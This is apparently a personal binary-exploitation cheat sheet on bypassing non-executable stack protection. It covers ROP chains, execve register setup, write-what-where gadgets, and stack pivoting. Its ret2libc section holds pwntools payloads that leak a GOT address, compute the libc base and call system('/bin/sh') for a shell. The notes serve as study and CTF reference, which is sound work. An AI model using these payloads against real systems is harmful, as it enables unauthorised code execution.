# No eXecute

## ROP Chains

Pwntools ROP documentation: <https://docs.pwntools.com/en/latest/rop/rop.html>  
<https://github.com/Gallopsled/pwntools-tutorial/blob/master/rop.md>  
Stephen Sims - Return Oriented Shellcode (SANS SEC760 Content)  
<https://www.youtube.com/watch?v=7BMyVvYv5d0>  
Automate finding gadgets <https://github.com/packz/ropeme>  

Overflow a buffer to control the EIP/RIP.  
From the EIP/RIP onwards, place the address of the instructions you are using and any values that need to be popped into registers, followed by an (32bit: `int 0x80` or 64bit: `syscall`) to switch to kernel mode and execute the system call.  

You can view the available gadgets in a program with `ropper`  
E.g. `ropper -f vuln` to view all of the gadgets in a binary.  


**Calling execve():**  
- AL register needs to hold 0x0b
- BX register needs to hold a pointer to your arg for the system call
- CX register points to the arg vector ARGV pointer array
- DX register points to the ENVP array (Environment Variable Pointer)

If the program has an mmap() function, you need to find rop gadgets **after** the mmap() has occurred to ensure the gadgets do exist in memory.  
- You can then use `ltrace` to view the address where mmap is mapped and add instuction offsets
- Validate by hitting a breakpoint in gdb and addid the 2 values, then `x/i $addr`

### Write What Where

Gadgets that allow you to store data in memory, i.e. create a pointer to an argument.  
 
E.g.  

```asm
# Basic and best example
mov [rdi], rsi; ret;

# Alternative:
xchg byte ptr [rdi], bl; ret;
```

### Writeable Locations

Find writable sections with `readelf -S -W ./vuln`  
Use pwntools to reference section addresses:  
```python
from pwn import *
context.binary = elf = ELF("./vuln")
print(elf.symbols)
```

**.data** stores initialised variables.  
The address of .data can be found with:  
```python
from pwn import *
context.binary = elf = ELF("./vuln")
data_section = elf.symbols.data_start
```

**.bss** stores uninitialised variables.  
The address of .bss can be found with:  
```python
from pwn import *
context.binary = elf = ELF("./vuln")
bss_section = elf.symbols.__bss_start
```

## ret2libc

*Methodology:*  
Use `printf` or `puts` to leak and address, then calculate the libc base address,  
and from that, call `system()` with `/bin/sh` as its argument.  

**Information gathering:**  
Determine the version of libc in use:  
`ldd <target_binary>`  
Find offsets to useful functions:  
`readelf -W -s <libc_file>`  

```python3
# Offsets
offsetPuts = 0x00074db0
offsetSystem = 0x0004c800
offsetBinSh = 0x1b5faa
```
```bash
# To get the offset of /bin/sh you may need to search in GDB:
gdb <target_binary>
b main
run
vmmap libc
search /bin/sh
# subtract the libc start address from the /bin/sh location to find it's offset
```

Gather some addresses to leak values, and any ROP gadgets needed to  
fill registers or remove items from the stack after use.  

```python3
puts_got = p32(elf.got.puts)
puts_plt = p32(elf.plt.puts)
main_ptr = p32(elf.symbols.main)
pop_ebx = p32(0x0804901e) # 0x0804901e: pop ebx; ret;
ret = p32(0x0804900a) # 0x0804900a: ret;
```

**Send a payload to leak the address of puts in the GOT**  

```python3
# 32 Bit example
payload1 = flat([
    offset, # Overflow the buffer to the save EIP
    puts_plt, # Function to call
    pop_ebx, # Address we return to after the puts function (cleans our arg from the stack
    puts_got, # Argument for puts call
    main_ptr # run main again so we can send a new payload
])
io.sendline(payload1)
leak = io.recv() # The first bytes will contain your leaked address. Bytes should be received up until your next input line.

# 64 Bit example
payload2 = flat([
    offset, # Overflow the buffer to the save RIP
    pop_rdi, # pop our argument into the RDI register
    puts_got, # argument of the puts call
    puts_plt, # call puts
    main_ptr # run main again to send a new payload
])
io.sendline(payload2)
leak = io.recv() # The first bytes will contain your leaked address. Bytes should be received up until your next input line.
```

*Note: You may need to call certain functions to trigger population of the GOT  
before you start leaking adresses*  

**Save the leaked address and calculate offsets**  

```python3
# 32 Bit
address = unpack(leak[:4])
print(hex(address))

base = address - offsetPuts
system = base + offsetSystem
binSh = base + offsetBinSh

# 64 Bit
address = leak[:6]
address += b"\x00\x00"
print(f"Leaked address: {hex(unpack(leak))}")

base = unpack(address) - offsetPuts
system = base + offsetSystem
binSh = base + offsetBinSh
```

**Spawn a shell**  

```python3
# 32 Bit
payload2 = flat([
    offset, # overflow the buffer up until the saved EIP
    system, # call system
    b"BBBB", # dummy return address
    binSh # pointer to "/bin/sh" as the system() argument
])
io.sendline(payload2)
io.interactive()

# 64 Bit
payload2 = flat([
    offset, # overflow the buffer up until the saved RIP
    ret, # A ret gadget may be needed for stack alignment
    pop_rdi, # save the argument in RDI
    binSh, # Argument for system
    system # call system
])
io.sendline(payload2)
io.interactive()
```

## Stack Pivoting

Gadgets to control ESP/RSP:  

```asm
pop rsp; ret;               # Unlikely, but great

xchg <reg>, rsp; ret;       # Just need to control the register in question:
# eg.
pop <reg>; ret;
<reg value>
xchg <reg>, rsp; ret

leave; ret;                 # These are everywhere
```

leave; ret; explanation:  
`leave` is equivalent to `mov rsp, rbp; pop rbp;`  
So a `leave; ret;` looks like `mov rsp, rbp; pop rbp; pop rip;`  
That means that when we overwrite RIP, the 8 bytes before it overwrite RBP (4 bytes for ESP)  
If we then call `leave; ret;` again, RBP is moved into RSP, thus giving us control over the stack location.  

### Example "leave; ret;" Payload

*Note: Not sure if this works.*  

```python3
from pwn import *
rop.raw([
    b"A" * rbp_offset, # rip control - 8 (4 for 32bit)
    new_stack_addr,
    leave_ret,
])
```

### Example "xchg rax, rsp; ret;" Payload

Using a simple `xchg` instruction where we control the register that is exchanged with esp.  
*This doesn't cover finding a new stack location*  

```python
from pwn import *

xchg = p32(0x0804882e) # 0x0804882e: xchg eax, esp; ret;
pop = p32(0x0804882c) # 0x0804882c: pop eax; ret;

payload = flat([
  pop,
  leaked_addr,
  xchg
])
```

### Example "sub esp, 0x20"

If you don't have much space for a rop chain, eg. only 4 or 8 bytes are overflowed out of the buffer,  
you can utilise a `sub esp, 0x20`, or similar to move the stack pointer lower in memory,  
where you have additional ROP gadgets.  
Use ROP gadgets in your offset data rather than just junk alone.  
